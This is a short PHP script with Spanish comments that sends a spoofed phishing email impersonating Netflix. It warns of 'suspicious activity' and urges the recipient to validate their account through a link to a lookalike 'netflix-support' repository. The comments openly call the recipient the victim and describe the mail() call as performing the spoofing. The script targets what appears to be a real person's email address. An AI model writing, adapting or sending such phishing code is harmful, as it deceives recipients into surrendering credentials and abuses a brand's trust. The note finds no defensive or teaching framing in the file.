<?php

$to = "roxanabettin234@gmail.com"; //Correo electrónico de la víctima a quien desea enviar un correo electrónico

$subject = "SE HA DETECTADO ACTIVIDAD SOSPECHOSA";

$message = "El equipo de Netflix ha detectado ciertas modificaciones en su cuenta, por favor ingresar en el siguiente link para validar
            y autentificar su usuario, vamos a realizar modificaciones para proporcionar mejoras en la seguridad de su usuario.
            
            https://github.com/netflix-support/Segurity.git";

$from = "supportNetflix@gmail.com"; // Correo electrónico de la víctima de quien desea enviar un correo electrónico

$headers = "From:" . $from;

$mail = mail($to,$subject,$message,$headers,$from); // Este mail () hará nuestro trabajo de spoofing

if($mail) 
{
echo "Email enviado con exito".$to;
}
?>